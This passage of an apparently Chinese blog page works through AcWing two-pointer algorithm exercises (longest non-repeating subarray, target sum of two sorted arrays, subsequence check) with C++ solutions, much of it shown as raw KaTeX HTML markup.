class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span> 范围内），表示整数序列。</p><p><strong>输出格式</strong></p><p>共一行，包含一个整数，表示最长的不包含重复的数的连续区间的长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>51 2 2 3 5</code></pre><p><strong>输出样例：</strong></p><pre><code>3</code></pre><h3 id="双指针算法-2">双指针算法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  </span><br><span class="line">  unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">    hash[a[j]]++;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j &amp;&amp; hash[a[j]] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      hash[a[i]]--;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">max</span>(res, j - i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="队列等价">队列等价</h3><p><strong>双指针算法</strong> 和 <strong>双向队列</strong> 是等价的，但是使用 <strong>双指针</strong> 能灵活高效。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  <span class="comment">// 不能for (auto x: a)</span></span><br><span class="line">  <span class="type">int</span> x = a[i];</span><br><span class="line">  q.<span class="built_in">push</span>(x);</span><br><span class="line">  hash[x]++;</span><br><span class="line">  <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; hash[q.<span class="built_in">back</span>()] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    hash[q.<span class="built_in">front</span>()]--;</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  res = <span class="built_in">max</span>(res, (<span class="type">int</span>)q.<span class="built_in">size</span>());  <span class="comment">// 得转int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-800-数组元素的目标和"><a href="https://www.acwing.com/problem/content/802/">AcWing 800. 数组元素的目标和</a></h2><p>给定两个升序排序的有序数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，以及一个目标值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。</p><p>数组下标从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始。</p><p>请你求出满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>+</mo><mi>B</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">A[i] + B[j] = x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 的数对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(i, j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>。</p><p>数据保证有唯一解。</p><p><strong>输入格式</strong></p><p>第一行包含三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo separator="true">,</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">n,m,x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span></span></span></span>，分别表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 的长度，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的长度以及目标值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>。</p><p>第三行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数，表示数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共一行，包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>数组长度不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>。<br>同一数组内元素各不相同。<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mtext>数组元素</mtext><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le 数组元素 \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">数组元素</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>4 5 61 2 4 73 4 6 8 9</code></pre><p><strong>输出样例：</strong></p><pre><code>1 1</code></pre><h3 id="双指针">双指针</h3><p>题目要求只有一对，但只要代码18行不break掉，是可以找出所有对的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, x;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;x);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = m - <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (a[i] + b[j] &gt; x) j--;</span><br><span class="line">    <span class="keyword">if</span> (a[i] + b[j] == x) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, i, j);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-2816-判断子序列"><a href="https://www.acwing.com/problem/content/2818/">AcWing 2816. 判断子序列</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,…,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 以及一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 的整数序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>b</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">b_1,b_2,…,b_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>请你判断 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 序列是否为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 序列的子序列。</p><p>子序列指序列的一部分项按<strong>原有次序排列</strong>而得的序列，例如序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">{a_1,a_3,a_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 是序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">{a_1,a_2,a_3,a_4,a_5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 的一个子序列。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n,m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo 